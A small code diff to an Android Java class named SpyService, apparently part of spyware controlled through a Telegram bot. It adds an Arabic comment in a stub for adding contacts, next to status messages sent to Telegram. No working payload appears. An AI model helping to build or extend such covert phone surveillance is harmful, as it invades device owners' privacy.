@@ -1305,6 +1305,7 @@ public class SpyService extends Service {
                 sendTextToTelegram("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
                 return;
             }
+            // واجهة إضافة جهة اتصال (سيتم تطويرها لاحقاً)
             sendTextToTelegram("➕ سيتم قريباً إضافة جهة اتصال من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إضافة جهة اتصال: " + e.getMessage());
